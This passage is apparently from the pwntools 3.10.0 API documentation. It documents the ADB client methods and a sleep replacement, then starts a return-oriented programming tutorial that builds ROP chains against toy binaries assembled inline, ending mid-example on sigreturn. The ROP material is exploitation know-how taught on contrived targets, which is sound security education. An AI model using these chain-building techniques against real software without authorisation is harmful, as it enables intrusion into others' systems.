e.g. the root directory (&#8216;/&#8217;), adbd cannot.</p>
<p>The SYNC APIs are executed within the adbd context, not the
shell user context.</p>
<p class="last">This issue is not a problem if the phone is rooted via
&#8216;adb root&#8217;, since adbd then runs in the <code class="docutils literal"><span class="pre">su</span></code> domain.</p>
</div>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">pprint</span><span class="p">(</span><span class="n">AdbClient</span><span class="p">()</span><span class="o">.</span><span class="n">list</span><span class="p">(</span><span class="s1">&#39;/data/user&#39;</span><span class="p">))</span>
<span class="go">{&#39;0&#39;: {&#39;mode&#39;: 41471, &#39;size&#39;: 11, &#39;time&#39;: ...}}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">AdbClient</span><span class="p">()</span><span class="o">.</span><span class="n">list</span><span class="p">(</span><span class="s1">&#39;/does/not/exist&#39;</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">PwnlibException</span>: <span class="n">Cannot list directory &#39;/does/not/exist&#39;: Does not exist</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.protocols.adb.AdbClient.read">
<code class="descname">read</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py#L130-137"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.AdbClient.read" title="Permalink to this definition">¶</a></dt>
<dd><p>Execute the <code class="docutils literal"><span class="pre">READ</span></code> command of the <code class="docutils literal"><span class="pre">SYNC</span></code> API.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>path</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path to the file to read</li>
<li><strong>filesize</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Size of the file, in bytes.  Optional.</li>
<li><strong>callback</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#callable" title="(in Python v2.7)"><em>callable</em></a>) &#8211; <p>Callback function invoked as data
becomes available.  Arguments provided are:</p>
<ul>
<li>File path</li>
<li>All data</li>
<li>Expected size of all data</li>
<li>Current chunk</li>
<li>Expected size of chunk</li>
</ul>
</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The data received as a string.</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.protocols.adb.AdbClient.recvl">
<code class="descname">recvl</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py#L148-151"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.AdbClient.recvl" title="Permalink to this definition">¶</a></dt>
<dd><p>Receives a length-prefixed data buffer from the ADB server</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.protocols.adb.AdbClient.send">
<code class="descname">send</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py#L140-142"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.AdbClient.send" title="Permalink to this definition">¶</a></dt>
<dd><p>Sends data to the ADB server</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.protocols.adb.AdbClient.stat">
<code class="descname">stat</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py#L130-137"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.AdbClient.stat" title="Permalink to this definition">¶</a></dt>
<dd><p>Execute the <code class="docutils literal"><span class="pre">STAT</span></code> command of the <code class="docutils literal"><span class="pre">SYNC</span></code> API.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>path</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path to the file to stat.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">On success, a dictionary mapping the values returned.
If the file cannot be <a href="#id1"><span class="problematic" id="id2">``</span></a>stat()``ed, None is returned.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">expected</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;mode&#39;</span><span class="p">:</span> <span class="mi">16749</span><span class="p">,</span> <span class="s1">&#39;size&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;time&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">pwnlib</span><span class="o">.</span><span class="n">protocols</span><span class="o">.</span><span class="n">adb</span><span class="o">.</span><span class="n">AdbClient</span><span class="p">()</span><span class="o">.</span><span class="n">stat</span><span class="p">(</span><span class="s1">&#39;/proc&#39;</span><span class="p">)</span>           <span class="o">==</span> <span class="n">expected</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">pwnlib</span><span class="o">.</span><span class="n">protocols</span><span class="o">.</span><span class="n">adb</span><span class="o">.</span><span class="n">AdbClient</span><span class="p">()</span><span class="o">.</span><span class="n">stat</span><span class="p">(</span><span class="s1">&#39;/does/not/exist&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="kc">None</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.protocols.adb.AdbClient.track_devices">
<code class="descname">track_devices</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py#L118-124"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.AdbClient.track_devices" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">Generator which returns a short-format listing of available
devices each time a device state changes.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.protocols.adb.AdbClient.transport">
<code class="descname">transport</code><span class="sig-paren">(</span><em>serial=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py#L214-238"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.AdbClient.transport" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets the Transport on the rmeote device.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">pwnlib</span><span class="o">.</span><span class="n">protocols</span><span class="o">.</span><span class="n">adb</span><span class="o">.</span><span class="n">AdbClient</span><span class="p">()</span><span class="o">.</span><span class="n">transport</span><span class="p">()</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.protocols.adb.AdbClient.unpack">
<code class="descname">unpack</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py#L144-146"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.AdbClient.unpack" title="Permalink to this definition">¶</a></dt>
<dd><p>Receives a hex-ascii packed integer from the ADB server</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.protocols.adb.AdbClient.version">
<code class="descname">version</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py#L118-124"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.AdbClient.version" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">Tuple containing the <code class="docutils literal"><span class="pre">(major,</span> <span class="pre">minor)</span></code> version from the ADB server</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">pwnlib</span><span class="o">.</span><span class="n">protocols</span><span class="o">.</span><span class="n">adb</span><span class="o">.</span><span class="n">AdbClient</span><span class="p">()</span><span class="o">.</span><span class="n">version</span><span class="p">()</span> 
<span class="go">(4, 36)</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.protocols.adb.AdbClient.write">
<code class="descname">write</code><span class="sig-paren">(</span><em>path</em>, <em>data</em>, <em>mode=493</em>, <em>timestamp=None</em>, <em>callback=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py#L449-473"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.AdbClient.write" title="Permalink to this definition">¶</a></dt>
<dd><p>Execute the <code class="docutils literal"><span class="pre">WRITE</span></code> command of the <code class="docutils literal"><span class="pre">SYNC</span></code> API.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>path</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path to the file to write</li>
<li><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Data to write to the file</li>
<li><strong>mode</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; File mode to set (e.g. <code class="docutils literal"><span class="pre">0o755</span></code>)</li>
<li><strong>timestamp</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Unix timestamp to set the file date to</li>
<li><strong>callback</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#callable" title="(in Python v2.7)"><em>callable</em></a>) &#8211; <p>Callback function invoked as data
is written.  Arguments provided are:</p>
<ul>
<li>File path</li>
<li>All data</li>
<li>Expected size of all data</li>
<li>Current chunk</li>
<li>Expected size of chunk</li>
</ul>
</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.protocols.adb.AdbClient.c">
<code class="descname">c</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.AdbClient.c" title="Permalink to this definition">¶</a></dt>
<dd><p>AdbClient&#8217;s connection to the ADB server</p>
</dd></dl>

</dd></dl>

<dl class="class">
<dt id="pwnlib.protocols.adb.Connection">
<em class="property">class </em><code class="descclassname">pwnlib.protocols.adb.</code><code class="descname">Connection</code><span class="sig-paren">(</span><em>host</em>, <em>port</em>, <em>level=None</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.Connection" title="Permalink to this definition">¶</a></dt>
<dd><p>Connection to the ADB server</p>
</dd></dl>

<dl class="class">
<dt id="pwnlib.protocols.adb.Message">
<em class="property">class </em><code class="descclassname">pwnlib.protocols.adb.</code><code class="descname">Message</code><span class="sig-paren">(</span><em>string</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.Message" title="Permalink to this definition">¶</a></dt>
<dd><p>An ADB hex-length-prefixed message</p>
</dd></dl>

<dl class="class">
<dt id="pwnlib.protocols.adb.Process">
<em class="property">class </em><code class="descclassname">pwnlib.protocols.adb.</code><code class="descname">Process</code><span class="sig-paren">(</span><em>host</em>, <em>port</em>, <em>level=None</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.Process" title="Permalink to this definition">¶</a></dt>
<dd><p>Duck-typed <code class="docutils literal"><span class="pre">tubes.remote</span></code> object to add properties of a <code class="docutils literal"><span class="pre">tubes.process</span></code></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.protocols.adb.proxy">
<code class="descclassname">pwnlib.protocols.adb.</code><code class="descname">proxy</code><span class="sig-paren">(</span><em>port=9999</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py#L573-578"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.proxy" title="Permalink to this definition">¶</a></dt>
<dd><p>Starts an ADB proxy on the specified port, for debugging purposes.</p>
</dd></dl>

</div>
</div>
</div>
</div>
<span id="document-replacements"></span><div class="section" id="module-pwnlib.replacements">
<span id="pwnlib-replacements-replacements-for-various-functions"></span><h3><a class="reference internal" href="#module-pwnlib.replacements" title="pwnlib.replacements"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.replacements</span></code></a> &#8212; Replacements for various functions<a class="headerlink" href="#module-pwnlib.replacements" title="Permalink to this headline">¶</a></h3>
<p>Improved replacements for standard functions</p>
<dl class="function">
<dt id="pwnlib.replacements.sleep">
<code class="descclassname">pwnlib.replacements.</code><code class="descname">sleep</code><span class="sig-paren">(</span><em>n</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/replacements.py#L7-20"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.replacements.sleep" title="Permalink to this definition">¶</a></dt>
<dd><p>Replacement for <a class="reference external" href="https://docs.python.org/2.7/library/time.html#time.sleep" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">time.sleep()</span></code></a>, which does not return if a signal is received.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>n</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Number of seconds to sleep.</td>
</tr>
</tbody>
</table>
</dd></dl>

</div>
<span id="document-rop"></span><div class="section" id="pwnlib-rop-return-oriented-programming">
<h3><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.rop</span></code> &#8212; Return Oriented Programming<a class="headerlink" href="#pwnlib-rop-return-oriented-programming" title="Permalink to this headline">¶</a></h3>
<div class="section" id="submodules">
<h4>Submodules<a class="headerlink" href="#submodules" title="Permalink to this headline">¶</a></h4>
<div class="toctree-wrapper compound">
<span id="document-rop/rop"></span><div class="section" id="module-pwnlib.rop.rop">
<span id="pwnlib-rop-rop-return-oriented-programming"></span><h5><a class="reference internal" href="#module-pwnlib.rop.rop" title="pwnlib.rop.rop"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.rop.rop</span></code></a> &#8212; Return Oriented Programming<a class="headerlink" href="#module-pwnlib.rop.rop" title="Permalink to this headline">¶</a></h5>
<p>Return Oriented Programming</p>
<div class="section" id="manual-rop">
<h6>Manual ROP<a class="headerlink" href="#manual-rop" title="Permalink to this headline">¶</a></h6>
<p>The ROP tool can be used to build stacks pretty trivially.
Let&#8217;s create a fake binary which has some symbols which might
have been useful.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="s1">&#39;add esp, 0x10; ret&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">binary</span><span class="o">.</span><span class="n">symbols</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;read&#39;</span><span class="p">:</span> <span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="s1">&#39;write&#39;</span><span class="p">:</span> <span class="mh">0xdecafbad</span><span class="p">,</span> <span class="s1">&#39;exit&#39;</span><span class="p">:</span> <span class="mh">0xfeedface</span><span class="p">}</span>
</pre></div>
</div>
<p>Creating a ROP object which looks up symbols in the binary is
pretty straightforward.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
</pre></div>
</div>
<p>With the ROP object, you can manually add stack frames.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;abcd&#39;</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</pre></div>
</div>
<p>Inspecting the ROP stack is easy, and laid out in an easy-to-read
manner.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">()</span>
<span class="go">0x0000:              0x0</span>
<span class="go">0x0004:       0x64636261</span>
<span class="go">0x0008:              0x2</span>
</pre></div>
</div>
<p>The ROP module is also aware of how to make function calls with
standard Linux ABIs.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">,</span> <span class="p">[</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">])</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">()</span>
<span class="go">0x0000:              0x0</span>
<span class="go">0x0004:       0x64636261</span>
<span class="go">0x0008:              0x2</span>
<span class="go">0x000c:       0xdeadbeef read(4, 5, 6)</span>
<span class="go">0x0010:           &#39;eaaa&#39; &lt;pad&gt;</span>
<span class="go">0x0014:              0x4 arg0</span>
<span class="go">0x0018:              0x5 arg1</span>
<span class="go">0x001c:              0x6 arg2</span>
</pre></div>
</div>
<p>You can also use a shorthand to invoke calls.
The stack is automatically adjusted for the next frame</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">rop</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">rop</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">()</span>
<span class="go">0x0000:              0x0</span>
<span class="go">0x0004:       0x64636261</span>
<span class="go">0x0008:              0x2</span>
<span class="go">0x000c:       0xdeadbeef read(4, 5, 6)</span>
<span class="go">0x0010:       0x10000000 &lt;adjust: add esp, 0x10; ret&gt;</span>
<span class="go">0x0014:              0x4 arg0</span>
<span class="go">0x0018:              0x5 arg1</span>
<span class="go">0x001c:              0x6 arg2</span>
<span class="go">0x0020:           &#39;iaaa&#39; &lt;pad&gt;</span>
<span class="go">0x0024:       0xdecafbad write(7, 8, 9)</span>
<span class="go">0x0028:       0x10000000 &lt;adjust: add esp, 0x10; ret&gt;</span>
<span class="go">0x002c:              0x7 arg0</span>
<span class="go">0x0030:              0x8 arg1</span>
<span class="go">0x0034:              0x9 arg2</span>
<span class="go">0x0038:           &#39;oaaa&#39; &lt;pad&gt;</span>
<span class="go">0x003c:       0xfeedface exit()</span>
<span class="go">0x0040:           &#39;qaaa&#39; &lt;pad&gt;</span>
</pre></div>
</div>
</div>
<div class="section" id="rop-example">
<h6>ROP Example<a class="headerlink" href="#rop-example" title="Permalink to this headline">¶</a></h6>
<p>Let&#8217;s assume we have a trivial binary that just reads some data
onto the stack, and returns.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">c</span> <span class="o">=</span> <span class="n">constants</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">=</span>  <span class="s1">&#39;read:&#39;</span>      <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="s1">&#39;esp&#39;</span><span class="p">,</span> <span class="mi">1024</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;ret</span><span class="se">\n</span><span class="s1">&#39;</span>
</pre></div>
</div>
<p>Let&#8217;s provide some simple gadgets:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;add_esp: add esp, 0x10; ret</span><span class="se">\n</span><span class="s1">&#39;</span>
</pre></div>
</div>
<p>And perhaps a nice &#8220;write&#8221; function.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;write: enter 0,0</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;    mov ebx, [ebp+4+4]</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;    mov ecx, [ebp+4+8]</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;    mov edx, [ebp+4+12]</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;ebx&#39;</span><span class="p">,</span> <span class="s1">&#39;ecx&#39;</span><span class="p">,</span> <span class="s1">&#39;edx&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;    leave</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;    ret</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;flag: .asciz &quot;The flag&quot;</span><span class="se">\n</span><span class="s1">&#39;</span>
</pre></div>
</div>
<p>And a way to exit cleanly.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;exit: &#39;</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">binary</span>   <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="n">assembly</span><span class="p">)</span>
</pre></div>
</div>
<p>Finally, let&#8217;s build our ROP stack</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">rop</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">STDOUT_FILENO</span><span class="p">,</span> <span class="n">binary</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">],</span> <span class="mi">8</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">rop</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">()</span>
<span class="go">0x0000:       0x10000012 write(STDOUT_FILENO, 268435494, 8)</span>
<span class="go">0x0004:       0x1000000e &lt;adjust: add esp, 0x10; ret&gt;</span>
<span class="go">0x0008:              0x1 arg0</span>
<span class="go">0x000c:       0x10000026 flag</span>
<span class="go">0x0010:              0x8 arg2</span>
<span class="go">0x0014:           &#39;faaa&#39; &lt;pad&gt;</span>
<span class="go">0x0018:       0x1000002f exit()</span>
<span class="go">0x001c:           &#39;haaa&#39; &lt;pad&gt;</span>
</pre></div>
</div>
<p>The raw data from the ROP stack is available via <cite>str</cite>.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">raw_rop</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">enhex</span><span class="p">(</span><span class="n">raw_rop</span><span class="p">)</span>
<span class="go">120000100e000010010000002600001008000000666161612f00001068616161</span>
</pre></div>
</div>
<p>Let&#8217;s try it out!</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">raw_rop</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
<span class="go">The flag</span>
</pre></div>
</div>
</div>
<div class="section" id="rop-sigreturn">
<h6>ROP + Sigreturn<a class="headerlink" href="#rop-sigreturn" title="Permalink to this headline">¶</a></h6>
<p>In some cases, control of the desired register is not available.
However, if you have control of the stack, EAX, and can find a
<cite>int 0x80</cite> gadget, you can use sigreturn.</p>
<p>Even better, this happens automagically.</p>
<p>Our example binary will read some data onto the stack, and
not do anything else interesting.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">c</span> <span class="o">=</span> <span class="n">constants</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">=</span>  <span class="s1">&#39;read:&#39;</span>      <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="s1">&#39;esp&#39;</span><span class="p">,</span> <span class="mi">1024</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;ret</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;pop eax; ret</span><span class="se">\n</span><span class="s1">&#39;</span>
